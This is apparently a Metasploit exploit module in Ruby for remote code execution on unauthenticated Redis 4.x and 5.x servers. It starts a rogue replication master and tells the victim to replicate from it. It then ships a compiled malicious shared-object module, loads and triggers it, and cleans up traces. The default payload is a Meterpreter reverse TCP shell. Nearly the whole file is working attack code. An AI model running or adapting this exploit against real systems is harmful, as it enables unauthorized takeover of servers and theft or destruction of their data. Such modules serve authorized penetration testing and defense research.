##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::TcpServer
  include Msf::Exploit::FileDropper
  include Msf::Auxiliary::Redis

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Redis Unauthenticated Code Execution',
      'Description'    => %q{
        This module can be used to leverage the extension functionality added by Redis 4.x and 5.x 
        to execute arbitrary code, to transmit the evil extension it makes use of the feature of Redis
        which called replication between master and slave.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Green-m  <greenm.xxoo[at]gmail.com>'     # Metasploit module
        ],
      'References'     =>
        [
          [ 'URL', 'https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf'],
          [ 'URL', 'https://github.com/RedisLabs/RedisModulesSDK']
        ],

      'Platform'       => 'linux',
      'Arch'           => [ARCH_X86, ARCH_X64],
      'Targets'        =>
        [
          ['Automatic',  {} ],
        ],
      'DefaultOptions' => {
          'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp',
          'SRVPORT' => '6379'
        },
      'Privileged'     => false,
      'DisclosureDate' => 'Nov 13 2018',
      'DefaultTarget'  => 0
      ))


    register_options(
      [
        Opt::RPORT(6379),
        OptPath.new('LOCALFILE', [false, 'Local shared object file to be sync and load by redis']),
        #OptBool.new('FLUSHALL', [true, 'Run flushall to remove all redis data before saving', false])
      ]
    )

    register_advanced_options(
      [
        OptString.new('RedisModuleInit', [false, 'The command of module to load and unload.']),
        OptString.new('RedisModuleTrigger', [false, 'The command of module to trigger evil function.']),
      ]
    )
  end

  #
  # Now tested on redis 4.x and 5.x
  #
  def check
    connect
    # they are only vulnerable if we can run the CONFIG command, so try that
    return Exploit::CheckCode::Safe unless (config_data = redis_command('CONFIG', 'GET', '*')) && config_data =~ /dbfilename/

    if (info_data = redis_command('INFO')) && /redis_version:(?<redis_version>\S+)/ =~ info_data
      report_redis(redis_version)
    end

    Exploit::CheckCode::Vulnerable
  ensure
    disconnect
  end

  def exploit

    @module_init_name = datastore['RedisModuleInit']    || Rex::Text.rand_text_alpha_lower(4..8)
    @module_cmd       = datastore['RedisModuleTrigger'] || "#{@module_init_name}.#{Rex::Text.rand_text_alpha_lower(4..8)}"
   
    if srvhost == "0.0.0.0" 
      fail_with(Failure::BadConfig, "Make sure SRVHOST not be 0.0.0.0, or the slave failed to find master.")
    end

    unless datastore['LOCALFILE']
      buf = create_payload
      vprint_status(buf)

      generate_code_file(buf)

      compile_payload
    end

    connect

    redis_command('SLAVEOF', srvhost, srvport.to_s)
    redis_command('CONFIG', 'SET', 'dbfilename', "#{File.basename(module_file)}")
    ::IO.select(nil, nil, nil, 2.0)

    start_rogue_server
    redis_command('MODULE', 'LOAD', "./#{File.basename(module_file)}")
    redis_command('SLAVEOF', 'NO', 'ONE')

    #trigger
    redis_command("#{@module_cmd}")

    # clean up
    Rex.sleep(2)
    redis_command('CONFIG', 'SET', 'dbfilename', 'dump.rdb')
    register_file_for_cleanup("./#{File.basename(module_file)}")
    redis_command('MODULE', 'UNLOAD', "#{@module_init_name}")

  ensure
    disconnect
  end

  #
  # we pretend to be a real redis server, and then slave the victim.
  #
  def start_rogue_server
    socket = Rex::Socket::TcpServer.create({'LocalHost'=>srvhost,'LocalPort'=>srvport})
    print_status("Listening on #{srvhost}:#{srvport}")
    rsock = socket.accept()
    vprint_status("Accepted a connection")

    # Start negotiation
    while true
      request = rsock.read(1024)
      vprint_status("in<<<"+request.inspect)
      response = ""
      finish = false

      case 
      when request.include?("PING")
        response = "+PONG\r\n"
      when request.include?("REPLCONF")
        response = "+OK\r\n"
      when request.include?("PSYNC") || request.include?("SYNC") 
        response  = "+FULLRESYNC " + 'Z'*40 + " 1\r\n"
        response << "$#{payload_bin.length}\r\n"
        response << "#{payload_bin}\r\n"
        finish = true
      end

      if response.length < 200
        vprint_status("out>>>"+response.inspect) 
      else
        vprint_status("out>>>"+response.inspect[0..100]+ "......" + response.inspect[-100..-1])
      end
      
      rsock.put(response)

      if finish
        print_status("Rogue server close...")
        rsock.close()
        socket.close() 
        break
      end
    end

  end

  def generate_code_file(buf)
    template       = File.read(File.join(Msf::Config.data_directory, 'exploits', 'redis', 'module.erb'))
    File.open(File.join(Msf::Config.data_directory, 'exploits', 'redis', 'module.c'), 'w') { |file| file.write(ERB.new(template).result(binding))}
  end

  def compile_payload
#    cpu = nil
#    if target['Arch'] == ARCH_X86
#      cpu = Metasm::Ia32.new
#    elsif target['Arch'] == ARCH_X64
#      cpu = Metasm::X86_64.new
#    end
#
#    begin
#      elf = Metasm::ELF.compile_c(cpu, main).encode_string
#    rescue
#      print_error "Metasm Encoding failed: #{$ERROR_INFO}"
#      elog "Metasm Encoding failed: #{$ERROR_INFO.class} : #{$ERROR_INFO}"
#      elog "Call stack:\n#{$ERROR_INFO.backtrace.join("\n")}"
#      return
#    end
    
    make_file = File.join(Msf::Config.data_directory, 'exploits', 'redis', 'Makefile')
    vprint_status("Clean old files")
    system("make -C #{File.dirname(make_file)}/rmutil clean")
    system("make -C #{File.dirname(make_file)} clean")

    print_status("Compile redis module extension file")
    if system("make -C #{File.dirname(make_file)} -f #{make_file}")
      print_good("Payload #{} generate successful! ")
    else
      fail_with(Failure::BadConfig, "Check config of gcc compiler.")
    end

    File.rename(File.join(Msf::Config.data_directory, 'exploits', 'redis', 'module.so'), module_file)
  end

  def module_file
    return datastore['LOCALFILE'] if datastore['LOCALFILE'] && File.exist?(datastore['LOCALFILE'])
    @module_file ||= File.join(Msf::Config.data_directory, 'exploits', 'redis', "#{Rex::Text.rand_text_alpha_lower(4..8)}.so")
  end

  def create_payload
    p = payload.encoded
    Msf::Simple::Buffer.transform(p, 'c', 'buf')
  end

  def payload_bin
    @payload_bin ||= File.read(module_file)
  end
end